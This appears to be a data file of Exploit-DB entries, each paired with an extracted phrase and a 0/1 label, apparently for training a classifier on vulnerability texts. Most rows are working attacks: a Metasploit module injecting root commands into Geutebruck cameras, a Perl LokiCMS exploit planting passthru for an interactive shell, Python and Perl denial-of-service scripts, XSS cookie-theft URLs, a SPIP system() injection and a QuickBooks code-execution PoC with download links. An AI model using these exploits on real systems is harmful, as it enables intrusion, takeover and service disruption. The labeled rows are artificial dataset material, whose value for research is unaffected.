41360,"Geutebruck 5.02024 G-Cam/EFD-2250 - 'testaction.cgi' Remote Command Execution (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking   include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(update_info(info,       'Name'           => 'Geutebruck testaction.cgi Remote Command Execution',       'Description'    => %q{         This module exploits a an arbitrary command execution vulnerability. The         vulnerability exists in the /uapi-cgi/viewer/testaction.cgi page and allows an         anonymous user to execute arbitrary commands with root privileges.         Firmware <= 1.11.0.12 are concerned.         Tested on 5.02024 G-Cam/EFD-2250 running 1.11.0.12 firmware.       },       'Author'         =>         [           'Davy Douhine',	#CVE-2017-5173 (RCE) and metasploit module           'Florent Montel' 	#CVE-2017-5174 (Authentication bypass)           'Frederic Cikala' #CVE-2017-5174 (Authentication bypass)         ],       'License'        => MSF_LICENSE,       'References'     =>         [           [ 'CVE', '2017-5173' ],           [ 'CVE', '2017-5174' ],           [ 'URL', 'http://geutebruck.com' ]           [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-045-02' ]         ],       'Privileged'     => false,       'Payload'        =>         {           'DisableNops' => true,           'Space'       => 1024,           'Compat'      =>             {               'PayloadType' => 'cmd',               'RequiredCmd' => 'generic netcat bash',             }         },       'Platform'       => 'unix',       'Arch'           => ARCH_CMD,       'Targets'        => [[ 'Automatic', { }]],       'DefaultTarget'  => 0,       'DisclosureDate' => 'Aug 16 2016'))      register_options(       [         OptString.new('TARGETURI', [true, 'The base path to webapp', '/uapi-cgi/viewer/testaction.cgi']),       ], self.class)   end    def exploit     uri = normalize_uri(target_uri.path)     print_status(""#{rhost}:#{rport} - Attempting to exploit..."")     command = payload.encoded     res = send_request_cgi(       {         'uri'    => uri,         'method' => 'POST',         'vars_post' => {           'type' => ""ip"",           'ip' => ""eth0 1.1.1.1;#{command}"",         },     })   end  end",execute arbitrary commands with root privileges,1
25427,OneWorldStore - 'OWContactUs.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/13184/info  OneWorldStore is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/owContactUs.asp?sAction=Contact&sName=&sEmail='%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&sType=None+Specified&sDescription=dcrab,have arbitrary script code executed in the browser of an unsuspecting user,1
35001,SAP NetWeaver 7.0 - SQL Monitor Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/44904/info   The SQL Monitor of SAP NetWeaver is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com:50100/OpenSQLMonitors/servlet/ConnectionMonitorServlet?view=stmtpool&node=12924950&ds=SAPSR3DB&connid =com.sap.sql.jdbc.direct.DirectPooledConnection@1ed00a7<script>alert(document.cookie)</script>  http://www.example.com:50100/OpenSQLMonitors/servlet/CatalogBufferMonitorServlet?action=btnSHOW_COLUMNS&reqNode=12924950&reqBufferId= SAPSERVER:dm0:SAPSR3DB&reqTableColumns=BC_RPROF_PROFILE<script>alert(document.cookie)</script>,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
11117,"iOS Udisk FTP Basic Edition - Remote Denial of Service #!/usr/bin/python # # Apple Iphone/Ipod - Udisk FTP Basic Edition Remote 0day DOS exploit # Found by: Steven Seeley (mr_me) seeleymagic [at] hotmail [dot] com # Homepage: http://6tags.com/n/ # Price: $4.99 # Download: From the app store (use your itunes account) # Tested on: Iphone 3G - firmware 3.1.2 (Darwin kernel) # Greetz to: Corelan Security Team::corelanc0d3r/ekse/EdiStrosar/Rick2600/MarkoT/ # Advisory: http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-003-u-disk-ftp-pre-auth-remote-dos/ # # Note: This **could** be remotley exploitable with code execution.  # I have not reversed this app..  print ""|------------------------------------------------------------------|"" print ""|                         __               __                      |"" print ""|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"" print ""|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"" print ""| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"" print ""| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"" print ""|                                                                  |"" print ""|                                       http://www.corelan.be:8800 |"" print ""|                                              security@corelan.be |"" print ""|                                                                  |"" print ""|-------------------------------------------------[ EIP Hunters ]--|""  print ""[+] Apple Iphone/Ipod - Udisk FTP basic edition Remote DOS exploit"" import socket import sys  def Usage():     print (""Usage:  ./udisk.py <serv_ip>\n"")     print (""Example:./udisk.py 192.168.2.3\n"") if len(sys.argv) <> 2:         Usage()         sys.exit(1) else:     hostname = sys.argv[1]     username = ""anonymous""     passwd = ""\x41"" * 2047     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     try:         sock.connect((hostname, 8080)) 	print ""[+] Connecting to the target..""     except:         print (""[-] Connection error!"")         sys.exit(1)     r=sock.recv(1024)     print ""[+] Sending payload.. ph33r""     sock.send(""USER %s\r\n"" %username)     sock.send(""PASS %s\r\n"" %passwd)     sock.send(""PWD\r\n"")     sock.close()     print ""[+] Server is now DOS'ed!""     sys.exit(0);",DOS,1
28740,HAMweather 3.9.8 - 'template.php' Script Code Injection source: https://www.securityfocus.com/bid/20311/info  HAMweather is prone to a script-code-injection vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  HAMweather 3.9.8.4 and prior versions are vulnerable; other versions may also be affected.  http://www.example.com/hw3.php?daysonly=0).phpinfo().(,fails to sufficiently sanitize user-supplied data,1
30567,"Microsoft Agent - 'agentdpv.dll' ActiveX Control Malformed URL Stack Buffer Overflow source: https://www.securityfocus.com/bid/25566/info  Microsoft Agent (agentsvr.exe) is prone to a stack-based buffer-overflow vulnerability because the application fails to adequately bounds-check user-supplied data.  Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the currently logged-in user. Failed exploit attempts will likely result in denial-of-service conditions.   <script language=""javascript""> function document::OnClick() {         var agent, character, url;         agent = new ActiveXObject(""Agent.Control.2"");         agent.connected = true;         agent.Characters.Load(""Genie"", ""http:///"");         character = agent.Characters.Character(""Genie"");         character.Show();         character.Think (""brazil owns!"");         character.Speak('brazil owns!');         character.Play('Processing'); } </script>",the application fails to adequately bounds-check user-supplied data,0
27172,SPIP 1.8.2 - 'Spip_RSS.php' Remote Command Execution source: https://www.securityfocus.com/bid/16556/info  SPIP is prone to a remote command-execution vulnerability. This is due to a lack of proper sanitization of user-supplied input.  An attacker can exploit this issue to execute arbitrary remote PHP commands on an affected computer with the privileges of the webserver process.  Successful exploitation could facilitate unauthorized access; other attacks are also possible.  Version 1.8.2g and earlier are vulnerable; other versions may also be affected.  http://www.example.com/spip_rss.php?GLOBALS[type_urls]=/../ecrire/data/spip.log%00  http://www.example.com/spip_acces_doc.php3?id_document=0&file=<?system($_GET[cmd]);?> http://www.example.com/spip_rss.php?cmd=ls%20-la&GLOBALS[type_urls]=/../ecrire/data/spip.log%00,command-execution,1
5408,"LokiCMS 0.3.3 - Remote Command Execution # Author:	__GiReX__ # mySite:	girex.altervista.org # Date:		8/04/08  # CMS: 		LokiCMS <= 0.3.3 # Site:		lokicms.com  # Bug: 		PHP Code Injection # Exploit:	Remote Command Execution  # Vuln Code: admin.php  #	if ($_GET['default'] != '') { // User want's to set the default page #		writeconfig($c_password, $c_title, $c_header, $c_tagline, $c_footnote, stripslashes($_GET['default']), #		$c_theme, $c_language, $c_modrewrite, $c_simplelink, $c_code);  # Our bugged var $_GET['default'] is stripslashed so we don't need magic_quotes_gpc Off # writeconfig() simply put text into Config.php  # This is a very bugged CMS, only most dengerous bug is here reported    #!/usr/bin/perl -w # LokiCMS <= 0.3.3 Remote Command Execution Exploit # Works with magic_quotes_gpc = On # Coded by __GiReX__  use LWP::Simple;  if(not defined $ARGV[0]) {      banner();      print ""[-] Usage: perl $0 [host] [path]\n"";      print ""[-] Example: perl $0 localhost /lokicms/\n\n"";      exit; }   my $host  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];    $host .=  $ARGV[1] unless not defined $ARGV[1];  banner(); get($host.'admin.php?default=\';passthru($_GET[\'cmd\']);//') or die '[-] Error requesting page: admin.php';  while(1) {      print ""[+] Shell:~\$ "";      chomp($cmd = <STDIN>);      last if $cmd eq 'exit';      last if is_error(getprint($host.""includes/Config.php?cmd=${cmd}""));      print $resp; }  sub banner {      print ""[+] LokiCMS <= 0.3.3 Remote Command Execution Exploit\n"";      print ""[+] Coded by __GiReX__\n"";      print ""\n""; }  # milw0rm.com [2008-04-08]",Command Execution,1
39804,"Intuit QuickBooks Desktop 2007 < 2016 - Arbitrary Code Execution + Credits: Maxim Tomashevich from Thegrideon Software + Website: https://www.thegrideon.com/ + Details: https://www.thegrideon.com/qb-internals-sql.html  Vendor: --------------------- www.intuit.com www.intuit.ca www.intuit.co.uk  Product: --------------------- QuickBooks Desktop versions: 2007 - 2016  Vulnerability Type: --------------------- Arbitrary SQL / Code Execution  Vulnerability Details: --------------------- QuickBooks company files are SQL Anywhere database files and other QB formats are based on SQL Anywhere features as well. SQL code (Watcom SQL) is important part of QB workflow and it is arguably more powerful than VBA in MS Access or Excel and at the same time it is completely hidden and starts automatically with every opened file! Functions like xp_write_file, xp_cmdshell are included by default allowing ""rootkit"" installation in just 3 lines of code: get data from table -> xp_write_file -> xp_cmdshell. Procedure in one database can be used to insert code into another directly or using current user credential. Moreover real database content is hidden from QuickBooks users, so there is virtually unlimited storage for code, stolen data, etc. QBX (accountant's transfer copies) and QBM (portable company files) are even easier to modify but supposed to be send to outside accountant for processing during normal workflow. QBX and QBM are compressed SQL dumps, so SQL modification is as hard as replacing zlib compressed ""reload.sql"" file inside compound file. In all cases QuickBooks do not attempt (and have no ways) to verify SQL scripts and start them automatically with ""DBA"" privileges. It should be obvious that all outside files (qbw, qba, qbx, qbm) should be considered extremely dangerous. SQL Anywhere is built for embedded applications so there are number of tricks and functions (like SET HIDDEN clause) to protect SQL code from analysis making this severe QuickBooks design flaw.  Proof of Concept: --------------------- Below you can find company file created in QB 2009 and modified to start ""Notepad.exe"" upon every user login (Admin, no pass). This example will work in any version including 2016 (US, CA, UK) - login procedure execution is required in order to check QB version or edition or to start update, so you will see Notepad before QB ""wrong version"" error message.  https://www.thegrideon.com/qbint/QBFp.zip https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39804.zip  Disclosure Timeline: --------------------- Contacted Vendor: 2016-03-21 Contacted PCI Security Consul: 2016-04-15 PCI Security Consul: 2016-04-19 ""we are looking into this matter"", but no details requested. PoC sent to Vendor: 2016-04-26 [Unexpected and strange day by day activity from Intuit India employees on our website without any attempts to communicate -> public disclosure.] Public Disclosure: 2016-05-10  Severity Level: --------------------- High  Disclaimer: --------------------- Permission is hereby granted for the redistribution of this text, provided that it is not altered except by reformatting, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.",Arbitrary SQL / Code Execution,1
30489,Openads (PHPAdsNew) < 2.0.8 - 'lib-remotehost.inc.php' Remote File Inclusion source: https://www.securityfocus.com/bid/25277/info  Openads (formerly known as phpAdsNew) is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  Openads 2.0.11 and prior versions are vulnerable.   http://www.example.com/libraries/lib-remotehost.inc.php?phpAds_geoPlugin=EviL ShEll,fails to sufficiently sanitize user-supplied data,0
782,"TinyWeb 1.9 - Denial of Service #TinyWeb version 1.9 DoS Exploit #Coded bY ++Karak0rsan++ #Usage:perl tiny.pl [target] #Greetz:Phalaposher,r3d_b4r0n,Hurby,ZzagorR,L4M3R,zeronc,Atak,sloan,fox and #all my friends # w0rdz: cengiz g t ne sokam senin ehehheh bak exploit yay nlan rsa reziL #olacan :D ama #yay nlanmaz belki yay nlansada bo ver nickini s ylemiyom #anlamazlar :P okullar a l yo peder benim #bilg. kald r yo ne yapcam ben #bilmiyom a.k :) siktiri boktan bi dos exploiti yazd k yolluyoz g venlik #sitesine :D neyse uzatmayal m ""I AM 15 YEARS OLD"" ya m z belirtelim :D  $target=$ARGV[0];  if(!$ARGV[0]){         print ""TinyWeb version 1.9 DoS Exploit\n"";         print ""Coded by ++Karak0rsan++\n"";         print ""Usage:perl tiny.pl [target]\n""; }   use IO::Socket; $sock = new IO::Socket::INET( PeerAddr => $target, PeerPort => 80, Proto => 'tcp', Type => SOCK_STREAM, ); close($sock); if($sock){         print ""[+]Attacking...\n""; }   $ish=1;  do { $ish++; use IO::Socket; $socket = new IO::Socket::INET( PeerAddr => $target, PeerPort => 80, Proto => 'tcp', Type => SOCK_STREAM, ) or die ""Didnt Connect,please check your target address!\n""; print $socket ""GET /cgi-bin/.%00./dddd.html HTTP/1.0\r\n""; close($socket); } while ($ish < 10000);  print ""OK ;)\n""; exit();  # milw0rm.com [2005-02-01]",denial of service,1
